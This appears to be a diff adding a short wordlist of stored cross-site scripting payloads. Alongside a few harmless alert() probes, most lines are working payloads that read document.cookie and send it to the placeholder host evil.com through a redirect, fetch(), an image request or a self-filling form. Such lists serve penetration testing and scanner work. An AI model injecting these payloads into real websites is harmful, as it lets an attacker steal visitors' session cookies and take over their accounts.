@@ -1,0 +1,10 @@
+# XSS - Stored Payloads
+<script>alert('stored xss')</script>
+<img src=x onerror="alert('stored')">
+<svg/onload=alert('stored')>
+<script>document.location='https://evil.com/?c='+document.cookie</script>
+<script>fetch('https://evil.com/steal?d='+document.cookie)</script>
+<img src=x onerror="new Image().src='https://evil.com/?c='+document.cookie">
+<script>var i=new Image;i.src="https://evil.com/?c="+document.cookie</script>
+<script>setTimeout('alert(1)',0)</script>
+<form action="https://evil.com" method="POST"><input name="data" value=""><script>document.forms[0].data.value=document.cookie</script></form>
